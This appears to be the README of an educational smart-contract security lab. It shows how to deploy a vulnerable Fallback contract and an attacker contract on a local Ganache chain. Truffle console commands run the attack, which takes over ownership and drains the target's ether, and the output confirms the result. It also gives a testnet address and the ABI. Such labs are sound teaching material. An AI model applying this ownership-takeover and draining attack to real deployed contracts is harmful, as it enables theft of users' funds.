# fallback-attack

⚠️Do not try on mainnet!

transfer/send vs call
truffle console
remix
gas usage

## Configuration

### Install Truffle cli
_Skip if you have already installed._
```
npm install -g truffle
```

### Install Dependencies
```
npm install
```

## Deploy on local Ganache and Attack!💥

Start with staring Truffle console.
```
truffle console
truffle(development)> migrate --reset
truffle(development)> const accounts = await web3.eth.getAccounts()
truffle(development)> const [owner, hacker] = accounts
truffle(development)> const targetInstance = await Fallback.deployed()
truffle(development)> const hackerInstance = await Hacker.deployed()
truffle(development)> await hackerInstance.attack(Fallback.address, {from: hacker, value: web3.utils.toWei("1", "ether")})
```
Then you should see like:
```json
{
  tx: '0xee2ae07bf1379a9f196d1d16cdb9e21a898ed0c20eb45eb8b588e321d64a70e6',
  receipt: {
    transactionHash: '0xee2ae07bf1379a9f196d1d16cdb9e21a898ed0c20eb45eb8b588e321d64a70e6',
    transactionIndex: 0,
    blockHash: '0xede0df93bd74c8b44dbd284d5d5a1d1a2a55096fdfb6a00c5d0e1a9b61e52c02',
    blockNumber: 272,
    from: '0xabfbf3ab7467af1c88bfe1a20eb8012326b81661',
    to: '0x44f7de26ca91ebcc882dc1ca28e6e29e6abbea51',
    gasUsed: 90010,
    cumulativeGasUsed: 90010,
    contractAddress: null,
    logs: [],
    status: true,
    logsBloom: '0x04000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000200000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
    rawLogs: [ [Object] ]
  },
  logs: []
}
```

Check it the attack has been successed.
```
truffle(development)> const targetOwner = await targetInstance.owner()
truffle(development)> targetOwner === hackerInstance.address
true
truffle(development)> const balance = await web3.eth.getBalance(Fallback.address)
truffle(development)> balance.toString()
'0'
```

## Test

### Run Tests
```
truffle test
```

## Play on public net

The `Fallback` contract has been deployed at `0x47731653fFd286D6f218a2b5b0aB509F54da5C54` in `ropsten` net.

ABI:
```json
[
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "_newOwner",
          "type": "address"
        }
      ],
      "name": "NewOwner",
      "type": "event"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "contributions",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "contribute",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "getContribution",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ]
```
